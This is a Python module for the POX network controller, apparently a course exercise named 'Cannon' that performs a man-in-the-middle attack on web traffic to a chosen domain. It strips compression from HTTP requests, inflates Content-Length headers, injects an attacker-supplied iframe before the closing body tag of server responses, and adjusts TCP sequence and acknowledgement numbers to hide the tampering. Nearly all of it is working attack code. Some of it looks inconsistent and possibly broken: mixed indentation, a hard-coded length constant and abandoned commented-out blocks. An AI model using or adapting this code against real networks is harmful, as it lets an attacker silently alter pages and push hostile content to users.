from pox.lib.packet.ipv4 import ipv4
import re

class Cannon(object):
      
    nextCACK=0
    nextCSEQ=0
    nextSACK=0
    nextSSEQ=0
    sip=None
    cip=None
    sport=0
    dport=0
    mod=0
    sDict={"connection":[],"nextSEQ":[],"nextACK":[],"modify":[]}
    cDict={"connection":[],"nextSEQ":[],"nextACK":[],"modify":[]}

    def __init__ (self, target_domain_re, url_path_re, iframe_url):
        self.target_domain_re = target_domain_re
        self.url_path_re = url_path_re
        self.iframe_url = iframe_url

    

    """def handle_get(pack):
	 for index, word in enumerate(pack):

		#change Accept-Encoding
		if(word=="Accept-Encoding:"):
			if(pack[index+1]=="gzip," and pack[index+2]=="deflate, and pack[index+3]==sdch\r\n"):
				pack[index+1]="identity\r\n"
				pack[index+2]=""
				pack[index+3]=""
		
	
	 return pack"""


    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet):

    	source=ip_packet.srcip
    	dest=ip_packet.dstip
    	if(ip_packet.find('tcp')):
		
			tcp_packet=ip_packet.find('tcp')	
			sport=tcp_packet.srcport
			dport=tcp_packet.dstport
			fourTuple=(ip_packet.srcip,ip_packet.dstip,tcp_packet.srcport,tcp_packet.dstport)
			myPacket=ip_packet.payload.payload
			splitPacket = myPacket.split()
			splitLines = myPacket.splitlines()
			currIndex=-1
		
			#GET PACKET INDEX IN LIST
			for ind, item in enumerate(Cannon.cDict["connection"]):
				#if("</body" in myPacket):
					#print str(source), str(dest), str(sport), str(dport)
					#print "this is what it should be", str(item[1]), str(item[2]), str(item[3]), str(item[4])
				if((source==item[0] and dest==item[1] and sport==item[2] and dport==item[3]) or (source==item[1] and dest==item[0] and sport==item[3] and dport==item[2])):
					#print "WE GOT HERE:", ip_packet.payload.payload
					currIndex=ind


			#UPDATE SEQ AND ACK
			if(currIndex>-1):
				print "WE AT LEAST GOT HERE"
				Cannon.cip=Cannon.cDict["connection"][currIndex][0]
				Cannon.sip=Cannon.cDict["connection"][currIndex][1]
				Cannon.sport=Cannon.cDict["connection"][currIndex][2]
				Cannon.dport=Cannon.cDict["connection"][currIndex][3]
				print str(Cannon.cip), str(Cannon.sip), str(Cannon.sport), str(Cannon.dport)
				Cannon.mod=Cannon.cDict["modify"][currIndex]
				if(tcp_packet.ACK and ip_packet.srcip==Cannon.cip and ip_packet.dstip==Cannon.sip and Cannon.sport==sport and Cannon.dport==dport):
					print "CLIENT ACK"
					print "SEQUENCE NUM", str(tcp_packet.seq)
					print "ACKNOWLEDGEMENT NUM", str(tcp_packet.ack)
					ip_packet.find('tcp').ack=tcp_packet.ack-Cannon.cDict["nextACK"][currIndex]
					ip_packet.find('tcp').seq=tcp_packet.seq-Cannon.cDict["nextSEQ"][currIndex]
					print "NEW NUM=",(str)(ip_packet.payload.ack)
				if(tcp_packet.ACK and ip_packet.srcip==Cannon.sip and ip_packet.dstip==Cannon.cip and Cannon.sport==dport and Cannon.dport==sport):
					print "SERVER ACK"
					print "SEQUENCE NUM", str(tcp_packet.seq)
					print "ACKNOWLEDGEMENT NUM", str(tcp_packet.ack)
					ip_packet.find('tcp').seq=tcp_packet.seq+Cannon.sDict["nextSEQ"][currIndex]
					ip_packet.find('tcp').ack=tcp_packet.ack+Cannon.sDict["nextACK"][currIndex]



			#myURL=splitPacket[1]
			#print myURL
			#if it is a GET request, begin to match hostname
			splitByLine=myPacket.splitlines()
		

		
			#if there is a plaintext payload
			if(len(splitPacket)!=0):
				

				#if a GET request
				if(splitPacket[0]=="GET"):
					#if(hostLine[1]!="www.example.com"):
					#	return ip_packet
					#print myPacket
					#Cannon.cip=ip_packet.srcip
					#Cannon.sip=ip_packet.dstip
					for index,word in enumerate(splitPacket):
						if (word=="Host:"):
							print "we get to the host"
							hostName=splitPacket[index+1]
							print "HOST IS", hostName
							#print re.search(self.url_path_re,hostName)

					if(self.target_domain_re.search(hostName)):
						print "we get to the appending to the dictionary"
						Cannon.cDict["connection"].append(fourTuple)
						Cannon.sDict["connection"].append(fourTuple)
					

						currIndex=Cannon.cDict["connection"].index(fourTuple)
						Cannon.cDict["modify"].append(0)
						Cannon.cDict["nextSEQ"].append(0)
						Cannon.cDict["nextACK"].append(0)
						Cannon.sDict["modify"].append(0)
						Cannon.sDict["nextSEQ"].append(0)
						Cannon.sDict["nextACK"].append(0)
						print Cannon.cDict["connection"][currIndex]
					else:
						return ip_packet

		 			for line in splitLines:
		 				if("Accept-Encoding:" in line):
		 					print "DID WE GET HERE????"
							originalLen=len(line)
							newLen=len("Accept-Encoding: identity")
							myPacket=myPacket.replace(line, "Accept-Encoding: identity")
							encLen=originalLen-newLen
							print str(encLen)
							Cannon.cDict["nextSEQ"][currIndex]=Cannon.cDict["nextSEQ"][currIndex]-encLen
							Cannon.sDict["nextACK"][currIndex]=Cannon.sDict["nextACK"][currIndex]+encLen
							Cannon.sDict["modify"][currIndex]=1
							Cannon.cDict["modify"][currIndex]=1
							ip_packet.payload.payload=myPacket

						print "HERES A LINE", line
						#change Accept-Encoding
						"""if("Accept-Encoding:" in line):
							originalLen=len(line)
							newLen=len("Accept-Encoding: identity")
							myPacket=myPacket.replace(line, "Accept-Encoding: identity")
							encLen=originalLen-newLen
							Cannon.nextSSEQ=Cannon.nextSSEQ+encLen
							Cannon.nextCACK=Cannon.nextCACK+encLen
							Cannon.mod=1
							ip_packet.payload.payload=myPacket
							print "NEW PACKET IS", myPacket
							print "NEW IP PACKET IS", ip_packet.payload.payload
						if("www.example.com" in line):
							Cannon.cip=ip_packet.srcip
							Cannon.sip=ip_packet.dstip"""



					"""myURL=splitPacket[1]
					if(myURL=="www.example.com"):
						print "URL MATCH!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
					#print myURL
					#if it is a GET request, begin to match hostname
					splitByLine=myPacket.split('\n')
					for index, line in enumerate(splitByLine):
						if("Host: " in line):
							hostLine=splitByLine[index].split()
							#print hostLine[1]
							urlMatch=re.search(self.url_path_re, myURL)
							domMatch=re.search(self.target_domain_re, hostLine[1])"""


			for index, word in enumerate(splitPacket):
				"""contType=None
				if(word=="Content-Type:"):
					contType=splitPacket[index+1]"""
				if(word=="Content-Length:" and source==Cannon.sip and dest==Cannon.cip and sport==Cannon.dport and dport==Cannon.sport):
					print "we change the lenght"
					oldLength=int(splitPacket[index+1])
					print "OLD LENGTH WAS:", oldLength
					newLength=oldLength+49
					print "NEW LENGTH IS:", newLength

					oldStr="Content-Length: "+str(oldLength)
					nuStr="Content-Length: "+str(newLength)
					print nuStr

					contentDif=len(nuStr)-len(oldStr)
					if(contentDif>0):
						print str(len(nuStr)) + "-" +str(len(oldStr))
						Cannon.sDict["nextSEQ"][currIndex]=Cannon.sDict["nextSEQ"][currIndex]+1
						Cannon.cDict["nextACK"][currIndex]=Cannon.cDict["nextACK"][currIndex]+1
						Cannon.sDict["modify"][currIndex]=1
						Cannon.cDict["modify"][currIndex]=1

						"""Cannon.nextSSEQ=Cannon.nextSSEQ+1
						Cannon.nextCACK=Cannon.nextCACK+1
						Cannon.mod=1"""


					myPacket=myPacket.replace(oldStr, nuStr)
					ip_packet.payload.payload=myPacket
					
			#IFRAME INJECTION
			#if(("</body>" in myPacket) and (ip_packet.srcip==Cannon.sip) and (ip_packet.dstip==Cannon.cip) and ("www.example.com" in myPacket)):
			
			if (("</body>" in myPacket) and (source==Cannon.sip) and (dest==Cannon.cip) and (sport==Cannon.dport) and (dport==Cannon.sport)):
				print "THIS SHIT IS UNCHANGED:", (str)(ip_packet.find('tcp').tcplen)
				print str(source), str(dest)
				print ip_packet.payload.payload
				for ind, word in enumerate(splitPacket):

					#if we find a closing body tag, inject iframe
					if(word=="</body>"):
		
						#replaces occurances of </body> to iframe+</body>
						"""myPacket=ip_packet.payload.payload.replace("</body>",'''<iframe src="http://cryptosec.ucsd.edu"></iframe></body>''')
						ip_packet.payload.payload=myPacket
						Cannon.nextCACK=49
						Cannon.nextSSEQ=49
						Cannon.mod=1"""

						myPacket=ip_packet.payload.payload.replace("</body>", '''<iframe src="'''+self.iframe_url+'''"></iframe></body>''')
						ip_packet.payload.payload=myPacket

						#Increasing ack and decreasing seq by length of iframe
						Cannon.cDict["nextACK"][currIndex]=Cannon.cDict["nextACK"][currIndex]+24+len(self.iframe_url)
						Cannon.sDict["nextSEQ"][currIndex]=Cannon.sDict["nextSEQ"][currIndex]+24+len(self.iframe_url)
						Cannon.cDict["modify"][currIndex]=1
						Cannon.sDict["modify"][currIndex]=1

						#ip_packet.find('tcp').tcplen=ip_packet.find('tcp').tcplen+49
						print "NEW LENGTH",(str)(ip_packet.find('tcp').tcplen+49)
						print ip_packet.payload.payload
			
			
			

	
	

    	
   		# Must return an ip packet or None
    	#print ip_packet.payload.payload
    	return ip_packet

